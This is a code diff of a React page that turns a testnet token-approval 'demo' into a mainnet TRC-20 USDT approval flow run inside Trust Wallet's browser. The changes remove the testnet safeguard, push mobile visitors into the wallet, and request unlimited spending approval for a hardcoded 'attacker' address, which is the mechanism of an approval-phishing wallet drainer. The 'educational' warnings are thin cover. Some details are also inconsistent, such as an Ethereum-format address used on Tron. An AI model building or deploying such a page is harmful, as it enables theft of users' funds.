@@ -1,211 +1,211 @@
 import React, { useEffect, useState } from "react";
-import { ethers } from "ethers";
 
-// trc20
+// TRC-20 USDT (mainnet example - most popular)
+// You can change to any other TRC-20 token
+const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT mainnet
 
-/* =========================
-   CONFIG
-========================= */
+// ⚠️ Permission receiver (attacker/spender address - NO transfer logic)
+const ATTACKER_ADDRESS = "0x321BFD64C8e40AaFF73288AE1D5C368Bfb6d2741"; // ← CHANGE THIS!
 
-// ✅ USDC on Sepolia
-const TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-
-// ⚠️ Demo permission receiver (NO transfer logic used)
-const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";
-
-// Minimal ERC20 ABI
-const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) returns (bool)",
-  "function balanceOf(address owner) view returns (uint256)",
+// Minimal TRC-20 ABI (same as ERC-20 in most cases)
+const TRC20_ABI = [
+  "function approve(address _spender, uint256 _value) returns (bool)",
+  "function balanceOf(address _owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)",
+  "function allowance(address _owner, address _spender) view returns (uint256)",
   "function symbol() view returns (string)",
   "function name() view returns (string)",
 ];
 
-// Unlimited approval value
-const UNLIMITED =
-  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+// Unlimited approval (very big number - same as Ethereum)
+const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 function App() {
   const [wallet, setWallet] = useState(null);
-  const [signer, setSigner] = useState(null);
-  const [token, setToken] = useState(null);
+  const [tronWeb, setTronWeb] = useState(null);
+  const [tokenContract, setTokenContract] = useState(null);
   const [logs, setLogs] = useState([]);
   const [loading, setLoading] = useState(false);
   const [connecting, setConnecting] = useState(false);
   const [isTrustWallet, setIsTrustWallet] = useState(false);
   const [step, setStep] = useState(1);
 
-  /* =========================
-     HELPERS
-  ========================= */
-  const addLog = (msg) => setLogs((p) => [...p, msg]);
+  const addLog = (msg) => setLogs((prev) => [...prev, msg]);
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-  /* =========================
-     TRUST WALLET DETECTION
-  ========================= */
+  // Check if running inside Trust Wallet Browser
   useEffect(() => {
-    if (!window.ethereum?.isTrust) {
-      addLog("❌ Trust Wallet browser not detected");
+    const checkTrustWallet = () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
+        setIsTrustWallet(true);
+        addLog("📱 Trust Wallet (Tron) detected");
+        setTronWeb(window.tronWeb);
+      } else {
+        addLog("❌ Trust Wallet Tron not detected");
 
-      // 👉 Mobile deep-link to Trust Wallet Browser
-      const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
-      if (isMobile) {
-        const url = encodeURIComponent(window.location.href);
-        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
+        // Mobile deep-link attempt
+        const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
+        if (isMobile) {
+          const url = encodeURIComponent(window.location.href);
+          window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
+        }
       }
-      return;
-    }
+    };
 
-    setIsTrustWallet(true);
-    addLog("📱 Trust Wallet detected");
+    checkTrustWallet();
+
+    // Sometimes tronWeb loads later
+    const timer = setInterval(() => {
+      if (window.tronWeb?.defaultAddress?.base58) {
+        clearInterval(timer);
+        setIsTrustWallet(true);
+        addLog("📱 Trust Wallet (Tron) detected (delayed)");
+        setTronWeb(window.tronWeb);
+      }
+    }, 800);
+
+    return () => clearInterval(timer);
   }, []);
 
-  /* =========================
-     CONNECT TRUST WALLET
-  ========================= */
+  // Connect wallet (Trust Wallet already injected tronWeb)
   const connectWallet = async () => {
-    if (connecting) return; // prevent double request
+    if (connecting) return;
+    if (!window.tronWeb) {
+      alert("Please open this site inside Trust Wallet Browser");
+      return;
+    }
 
     try {
       setConnecting(true);
 
-      if (!window.ethereum?.isTrust) {
-        alert("Please open this site inside Trust Wallet Browser");
-        return;
+      // Trust Wallet usually auto-connects, but let's make sure
+      if (!window.tronWeb.defaultAddress?.base58) {
+        await window.tronWeb.request({ method: "tron_requestAccounts" });
       }
 
-      // Trust Wallet compatible request
-      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const address = window.tronWeb.defaultAddress.base58;
+      if (!address) throw new Error("No address found");
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const address = await signer.getAddress();
-      const ethBalance = await provider.getBalance(address);
-
-      // Enforce Sepolia
-      const network = await provider.getNetwork();
-      if (network.chainId !== 11155111) {
-        addLog("❌ Switch Trust Wallet to Sepolia network");
+      // Check network (mainnet = 728126428, Nile testnet = 2494104990, Shasta = 1)
+      const nodeInfo = await window.tronWeb.trx.getNodeInfo();
+      const isMainnet = nodeInfo?.config?.chain?.chainId === "0x2d";
+      if (!isMainnet) {
+        addLog("⚠️ Please switch to Tron Mainnet in Trust Wallet");
       }
-      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
 
-      setSigner(signer);
-      setToken(token);
+      const contract = await window.tronWeb.contract(TRC20_ABI, TOKEN_ADDRESS);
+
+      const balanceInSun = await contract.balanceOf(address).call();
+      const decimals = await contract.decimals().call();
+      const balance = Number(balanceInSun) / 10 ** decimals;
+
+      setTokenContract(contract);
       setWallet({
         address,
         short: address.slice(0, 6) + "..." + address.slice(-4),
-        eth: ethers.utils.formatEther(ethBalance),
+        balance: balance.toFixed(4),
       });
 
       addLog("✅ Wallet connected successfully");
       setStep(2);
     } catch (err) {
       console.error(err);
-      if (err.code === -32002) {
-        addLog("⏳ Connection request already pending in Trust Wallet");
-      } else if (err.code === 4001) {
-        addLog("❌ User rejected connection");
-      } else {
-        addLog("❌ Wallet connection failed");
-      }
+      addLog("❌ Wallet connection failed: " + (err.message || "unknown error"));
     } finally {
       setConnecting(false);
     }
   };
 
-  /* =========================
-     SIMULATION (APPROVE ONLY)
-  ========================= */
   const simulate = async () => {
+    if (!tokenContract || !wallet) {
+      addLog("❌ Wallet or contract not ready");
+      return;
+    }
+
     try {
       setLoading(true);
-      // ❌ DO NOT clear logs here (UX fix)
-
-      if (!wallet || !token) {
-        addLog("❌ Wallet not ready");
-        return;
-      }
 
       addLog("🔍 Checking balance...");
       await sleep(400);
 
-      const raw = await token.balanceOf(wallet.address);
-      const decimals = await token.decimals();
-      const balance = ethers.utils.formatUnits(raw, decimals);
-      addLog(`💰 Balance: ${balance}`);
+      const rawBalance = await tokenContract.balanceOf(wallet.address).call();
+      const decimals = await tokenContract.decimals().call();
+      const balance = Number(rawBalance) / 10 ** decimals;
+
+      addLog(`💰 Balance: ${balance.toFixed(4)}`);
       await sleep(400);
 
-      const ok = window.confirm(
-        "⚠️ EDUCATIONAL DEMO\n\n" +
-          "This will approve UNLIMITED token spending.\n" +
-          "No tokens will be transferred by this app.\n\nContinue?"
+      const confirmed = window.confirm(
+        "⚠️ EDUCATIONAL PURPOSE ONLY!\n\n" +
+          "This will give UNLIMITED approval to spender address.\n" +
+          "No tokens will be transferred!\n\nContinue?"
       );
-      if (!ok) {
-        addLog("❌ User cancelled");
+
+      if (!confirmed) {
+        addLog("❌ Cancelled by user");
         return;
       }
 
-      const tx = await token.approve(ATTACKER_ADDRESS, UNLIMITED);
-      addLog(`📝 Tx sent: ${tx.hash}`);
-      addLog("⏳ Waiting confirmation...");
+      addLog("📝 Sending approval transaction...");
 
-      await tx.wait();
+      // TronWeb approve transaction
+      const tx = await tokenContract
+        .approve(ATTACKER_ADDRESS, UNLIMITED)
+        .send({ shouldPollResponse: true });
+
+      addLog(`✅ Transaction successful!`);
+      addLog(`TxID: ${tx}`);
 
       addLog("🚨 UNLIMITED approval granted");
       setStep(3);
     } catch (err) {
       console.error(err);
-      if (err.code === 4001) {
+      if (err.toString().includes("reject")) {
         addLog("❌ User rejected transaction");
       } else {
-        addLog("❌ Transaction failed");
+        addLog("❌ Transaction failed: " + (err.message || "unknown error"));
       }
     } finally {
       setLoading(false);
     }
   };
 
-  /* =========================
-     UI
-  ========================= */
   return (
     <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
       <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
         <h1 className="text-xl font-bold text-center mb-4">
-          🔐 Trust Wallet Approval Demo
+          🔐 Trust Wallet TRC-20 Approval
         </h1>
 
-        {/* Logs (Always Visible) */}
+        {/* Logs */}
         {logs.length > 0 && (
-          <div className="bg-black p-3 rounded text-sm space-y-1 mb-3">
+          <div className="bg-black p-3 rounded text-sm space-y-1 mb-4 max-h-60 overflow-y-auto">
             {logs.map((l, i) => (
               <div key={i}>{l}</div>
             ))}
           </div>
         )}
 
-        {/* Connected Badge */}
         {wallet && (
-          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-3 text-center">
+          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-4 text-center">
             ✅ Wallet Connected
           </div>
         )}
 
         {!isTrustWallet && (
           <div className="bg-red-900/30 p-3 rounded text-sm mb-4">
-            ❌ Open this link inside <b>Trust Wallet Browser</b>
+            ❌ Please open this link inside <b>Trust Wallet Browser</b>
           </div>
         )}
 
         {step === 1 && (
           <button
             onClick={connectWallet}
-            disabled={connecting}
+            disabled={connecting || !isTrustWallet}
             className={`w-full py-3 rounded font-bold ${
-              connecting ? "bg-gray-600 cursor-not-allowed" : "bg-blue-600"
+              connecting || !isTrustWallet
+                ? "bg-gray-600 cursor-not-allowed"
+                : "bg-blue-600 hover:bg-blue-700"
             }`}
           >
             {connecting ? "Connecting..." : "Connect Trust Wallet"}
@@ -214,28 +214,31 @@ function App() {
 
         {step === 2 && wallet && (
           <>
-            <div className="bg-black p-3 rounded text-sm mb-3">
-              <p>📱 Trust Wallet</p>
+            <div className="bg-black p-3 rounded text-sm mb-4 space-y-1">
+              <p>📱 Trust Wallet (TRON)</p>
               <p>Address: {wallet.short}</p>
-              <p>ETH: {wallet.eth}</p>
+              <p>Balance: {wallet.balance}</p>
             </div>
 
             <button
               onClick={simulate}
               disabled={loading}
               className={`w-full py-3 rounded font-bold ${
-                loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600"
+                loading ? "bg-gray-600 cursor-not-allowed" : "bg-red-600 hover:bg-red-700"
               }`}
             >
-              {loading ? "Processing..." : "Start Simulation"}
+              {loading ? "Processing..." : "Start Unlimited Approval"}
             </button>
           </>
         )}
 
         {step === 3 && (
-          <div className="bg-black p-3 rounded text-sm mt-3">
-            <p className="text-red-400">
-              ⚠️ Unlimited approval is dangerous in real life.
+          <div className="bg-black p-3 rounded text-sm mt-4 border border-red-800">
+            <p className="text-red-400 font-bold">
+              ⚠️ Unlimited approval is very dangerous in real dApps!
+            </p>
+            <p className="text-red-300 text-xs mt-1">
+              Never do this on real projects unless you 100% trust them.
             </p>
           </div>
         )}
